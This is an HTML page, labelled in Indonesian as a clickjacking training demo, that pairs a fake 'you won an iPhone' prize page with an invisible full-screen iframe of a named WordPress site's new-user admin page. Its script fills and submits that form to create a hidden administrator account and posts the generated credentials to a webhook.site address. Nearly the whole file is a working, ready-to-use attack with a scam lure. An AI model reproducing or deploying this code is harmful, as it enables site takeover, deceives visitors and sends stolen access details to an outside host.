<!DOCTYPE html>
<html>
<head>
    <title>Demo Clickjacking - Training</title>
    <style>
        /* === TAMPILAN PALSU UNTUK USER === */
        body {
            font-family: Arial;
            background: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        
        .fake-site {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        
        .winner-banner {
            background: linear-gradient(45deg, #FF0000, #FF8800);
            color: white;
            padding: 30px;
            text-align: center;
            border-radius: 10px;
            margin-bottom: 30px;
        }
        
        .claim-button {
            background: #28a745;
            color: white;
            padding: 20px 40px;
            font-size: 24px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            display: block;
            margin: 30px auto;
            width: 80%;
            transition: all 0.3s;
        }
        
        .claim-button:hover {
            background: #218838;
            transform: scale(1.05);
        }
        
        /* === IFRAME TERSEMBUNYI === */
        .hidden-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            opacity: 0.0;
            z-index: 9999;
            pointer-events: none;
        }
        
        /* === DEBUG CONSOLE === */
        .debug-console {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: #000;
            color: #0f0;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 5px;
            max-width: 500px;
            z-index: 10000;
        }
    </style>
</head>
<body>

    <!-- ========================================== -->
    <!-- BAGIAN 1: WEBSITE PALSU (YANG DILIHAT USER) -->
    <!-- ========================================== -->
    
    <div class="fake-site">
        <div class="winner-banner">
            <h1>üéâ SELAMAT! ANDA MENANG! üéâ</h1>
            <p>Anda terpilih sebagai pemenang undian khusus!</p>
        </div>
        
        <h2>üì¶ HADIAH ANDA:</h2>
        <ul>
            <li>üí∞ <strong>Uang Tunai:</strong> Rp 5.000.000</li>
            <li>üì± <strong>iPhone 15 Pro Max</strong></li>
            <li>üéÆ <strong>PlayStation 5</strong></li>
        </ul>
        
        <p><strong>‚è∞ Klaim dalam 5 menit atau hadiah hangus!</strong></p>
        
        <!-- BUTTON JEBakanAN -->
        <button class="claim-button" id="claimButton">
            üéÅ KLIK DISINI UNTUK CLAIM HADIAH!
        </button>
        
        <p style="text-align: center; color: #666; font-size: 12px;">
            Anda akan diarahkan ke halaman verifikasi
        </p>
    </div>

    <!-- ========================================== -->
    <!-- BAGIAN 2: IFRAME TERSEMBUNYI (SERANGAN) -->
    <!-- ========================================== -->
    
    <iframe src="https://rumahtamushofia.my.id/wp-admin/user-new.php" 
            class="hidden-layer" 
            id="attackFrame">
    </iframe>

    <!-- ========================================== -->
    <!-- BAGIAN 3: KONSOL DEBUG -->
    <!-- ========================================== -->
    
    <div class="debug-console" id="debugConsole">
        üïµÔ∏è DEMO CLICKJACKING - DEBUG MODE<br>
        ================================<br>
        Status: <span id="status">READY</span><br>
        Target: WordPress Admin<br>
        Action: Create New User<br>
        <br>
        Press [V] - Show/hide hidden layer<br>
        Press [W] - Test webhook<br>
        <br>
        <span id="message">Loading...</span>
    </div>

    <script>
        // ==========================================
        // BAGIAN 4: SCRIPT LENGKAP DENGAN AUTO-FILL
        // ==========================================
        
        console.log('üîì Clickjacking Demo Loaded');
        let attackStep = 0;
        
        // Update status
        document.getElementById('status').textContent = 'READY';
        document.getElementById('message').textContent = 'Click the button above!';
        
        // FUNGSI UTAMA: Ketika user klik button hadiah
        document.getElementById('claimButton').addEventListener('click', function() {
            attackStep++;
            console.log('üéØ User clicked the button! Step:', attackStep);
            
            // Update UI
            document.getElementById('status').textContent = 'ATTACK TRIGGERED';
            document.getElementById('message').textContent = 'Executing attack...';
            
            // Kirim webhook
            sendWebhook('BUTTON_CLICKED', {step: attackStep});
            
            // EKSEKUSI SERANGAN KE WORDPRESS
            executeWordPressAttack();
        });
        
        // FUNGSI EKSEKUSI SERANGAN KE WORDPRESS
        function executeWordPressAttack() {
            const iframe = document.getElementById('attackFrame');
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            
            setTimeout(function() {
                try {
                    // GENERATE RANDOM USERNAME & EMAIL
                    const randomId = Date.now();
                    const username = 'hacker_admin_' + randomId;
                    const email = 'hacker' + randomId + '@gmail.com';
                    const password = 'HackerPassword123!';
                    
                    document.getElementById('message').textContent = 'Filling WordPress form...';
                    
                    // CARI DAN ISI FORM WORDPRESS
                    const usernameField = iframeDoc.querySelector('#user_login');
                    const emailField = iframeDoc.querySelector('#email');
                    const passwordField = iframeDoc.querySelector('#pass1');
                    const roleSelect = iframeDoc.querySelector('#role');
                    const submitButton = iframeDoc.querySelector('#createuser input[type="submit"]');
                    
                    if (usernameField && emailField) {
                        // ISI FORM DENGAN DATA HACKER
                        usernameField.value = username;
                        emailField.value = email;
                        if (passwordField) {
                            passwordField.value = password;
                            // Trigger password strength check
                            passwordField.dispatchEvent(new Event('input', { bubbles: true }));
                        }
                        if (roleSelect) roleSelect.value = 'administrator';
                        
                        document.getElementById('message').textContent = 'Form filled! Submitting...';
                        
                        // KIRIM DATA CREDENTIALS KE WEBHOOK
                        sendWebhook('CREDENTIALS_CREATED', {
                            username: username,
                            email: email, 
                            password: password,
                            role: 'administrator'
                        });
                        
                        // SUBMIT FORM (Buat user baru)
                        setTimeout(function() {
                            if (submitButton) {
                                submitButton.click();
                                document.getElementById('message').textContent = 'ATTACK SUCCESS! User created.';
                                sendWebhook('ATTACK_SUCCESS', {
                                    username: username,
                                    message: 'New admin user created successfully'
                                });
                                
                                alert('üö® SERANGAN BERHASIL!\n\nUser admin baru telah dibuat!\n\nUsername: ' + username + '\nPassword: ' + password + '\nRole: Administrator');
                            } else {
                                document.getElementById('message').textContent = 'Submit button not found';
                            }
                        }, 2000);
                        
                    } else {
                        document.getElementById('message').textContent = 'WordPress form not found (admin not logged in)';
                        sendWebhook('ATTACK_FAILED', {reason: 'WordPress form elements not found'});
                        alert('üîê SAFE DEMO: Admin tidak sedang login ke WordPress.\nJika admin login, serangan akan berhasil!');
                    }
                    
                } catch (error) {
                    document.getElementById('message').textContent = 'Error: ' + error.message;
                    sendWebhook('ERROR', {error: error.message});
                }
            }, 1000);
        }
        
        // FUNGSI KIRIM WEBHOOK
        function sendWebhook(event, additionalData = {}) {
            try {
                const webhookURL = "https://webhook.site/3dfed081-c1a9-4c24-a5b4-dac8fb673451";
                const data = {
                    event: event,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    ...additionalData
                };
                
                fetch(webhookURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                }).then(() => {
                    console.log('‚úÖ Webhook sent:', event);
                });
            } catch (e) {
                console.log('‚ö†Ô∏è Webhook failed: ' + e.message);
            }
        }
        
        // Keyboard shortcuts untuk demo
        document.addEventListener('keydown', function(event) {
            const iframe = document.getElementById('attackFrame');
            
            // [V] - Tampilkan/sembunyikan iframe
            if (event.key === 'v' || event.key === 'V') {
                iframe.style.opacity = iframe.style.opacity === '0.5' ? '0.0' : '0.5';
                document.getElementById('message').textContent = 
                    'Iframe: ' + (iframe.style.opacity === '0.5' ? 'VISIBLE' : 'HIDDEN');
            }
            
            // [W] - Test webhook
            if (event.key === 'w' || event.key === 'W') {
                document.getElementById('message').textContent = 'Testing webhook...';
                sendWebhook('MANUAL_TEST', {type: 'manual_test'});
            }
        });
        
        // Handle iframe load
        document.getElementById('attackFrame').onload = function() {
            document.getElementById('message').textContent = 'Hidden frame loaded! Click button.';
        };
        
        document.getElementById('attackFrame').onerror = function() {
            document.getElementById('message').textContent = 'Iframe failed to load';
        };
        
    </script>

</body>
</html>